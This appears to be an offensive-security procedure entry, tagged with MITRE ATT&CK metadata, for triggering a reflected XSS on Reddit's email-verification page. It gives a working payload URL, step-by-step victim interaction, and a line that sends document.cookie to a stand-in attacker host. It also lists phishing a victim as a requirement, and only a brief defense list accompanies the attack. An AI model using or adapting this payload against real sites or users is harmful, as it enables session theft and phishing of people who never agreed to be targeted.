---
id: c3d4e5f6-g7h8-9012-cdef-345678901234
tags:
  - xss-trigger
  - javascript-execution
  - social-engineering
type: procedure
tools: []
tactics:
  - '[[Execution]]'
  - '[[Collection]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T12:00:00Z'
techniques:
  - '[[JavaScript]]'
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:26:28.044Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
  - '[[Exploit Public-Facing Application]]'
---
# Trigger-XSS-Payload-via-Email-Verification-Button

## Summary

This procedure triggers the reflected XSS payload by visiting the malicious URL and interacting with the 'Verify Email' button on Reddit's interstitial page, causing the unsanitized path token to execute arbitrary JavaScript in the browser context.

## Description

Once the malicious URL is accessed, Reddit's server renders the verification page, echoing the path token (including the injected script) without sanitization. Clicking the 'Verify Email' button processes the page, executing the JavaScript. This can lead to cookie/session theft (e.g., via document.cookie), malware delivery through dynamic script loads, redirects for phishing, or HTML injection to alter the page for social engineering, such as faking email removal confirmations. The attack requires no authentication but relies on victim interaction.

## Requirements

1. Crafted malicious URL from prior procedure
2. Web browser capable of executing JavaScript
3. Victim access (e.g., via phishing email with the link)

## Defense

Defensive measures and detection strategies:

- Sanitize all reflected inputs with context-aware escaping (e.g., JavaScript string escaping for script contexts)
- Implement client-side validation or sandboxing for verification flows
- Log and alert on verification attempts with malformed tokens
- Educate users on verifying email links from trusted sources

## Objectives

1. Cause payload execution upon user interaction
2. Achieve arbitrary JavaScript control in the session
3. Facilitate data exfiltration or page manipulation

## Instructions

### Step 1: Navigate to Malicious URL

**Context**: Load the page to render the reflected content, setting up the interstitial.

Open the browser and enter or click the URL: https://www.reddit.com/verification/asd%27%2C%20alert(document.location)%2C%20%27

> The page loads showing the verification prompt with reflected (but not yet executed) payload.

### Step 2: Interact with Verification Button

**Context**: Trigger the reflection and execution by simulating legitimate verification.

Click the 'Verify Email' button on the interstitial page.

> This causes the page to process the token, injecting and running the JavaScript (e.g., alert box appears with current location).

### Step 3: Observe and Exploit Execution

**Context**: Confirm success and extend to real impacts like theft.

Check browser console or network tab for execution effects; for advanced payloads, monitor for exfiltrated data (e.g., POST to attacker server).

> Successful: Payload runs, enabling further actions like var x = document.cookie; fetch('http://attacker.com/steal?data='+x);

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]
- [[Collection]]

### Techniques

- [[JavaScript]]
- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss-trigger]]
- [[javascript-execution]]
- [[social-engineering]]
